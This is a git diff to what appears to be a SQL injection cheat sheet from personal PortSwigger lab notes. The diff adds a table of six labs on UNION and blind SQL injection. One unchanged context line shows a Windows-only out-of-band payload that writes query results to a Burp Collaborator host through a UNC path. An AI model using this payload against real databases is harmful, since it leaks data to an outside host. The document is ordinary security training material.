@@ -296,3 +296,16 @@ SELECT f();</code></pre></td>
     <td>The following technique works on Windows only:<br><pre><code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></pre></td>
   </tr>
 </table>
+
+---
+
+## Labs
+
+| #  | Lab                                                                                      | Last commit | Path                             |
+|----|------------------------------------------------------------------------------------------|-------------|----------------------------------|
+| 07 | Lab: SQL injection UNION attack, determining the number of columns returned by the query | 2026-11-08  | portswigger/sqli/07-union-attack |
+| 08 | Lab: SQL injection UNION attack, retrieving data from other tables                       | 2026-11-08  | portswigger/sqli/08-union-attack |
+| 09 | Lab: SQL injection UNION attack, retrieving multiple values in a single column           | 2026-11-08  | portswigger/sqli/09-union-attack |
+| 10 | Lab: Blind SQL injection with conditional responses                                      | 2026-11-08  | portswigger/sqli/10-blind-sqli   |
+| 11 | Lab: Blind SQL injection with conditional errors                                         | 2026-11-08  | portswigger/sqli/11-blind-sqli   |
+| 12 | Lab: Blind SQL injection with time delays                                                | 2026-11-08  | portswigger/sqli/12-blind-sqli   |
